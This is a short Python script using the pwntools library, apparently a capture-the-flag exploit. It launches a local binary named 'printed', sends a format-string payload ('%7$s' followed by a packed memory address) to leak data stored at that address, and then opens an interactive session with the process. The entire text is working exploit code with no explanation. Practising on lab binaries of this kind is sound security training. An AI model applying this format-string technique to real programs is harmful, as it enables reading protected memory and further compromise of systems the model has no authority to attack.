from pwn import *
p=process('./printed')
payload=b'%7$s0000'+p64(0x555555558060)
input()
p.sendline(payload)
p.interactive()
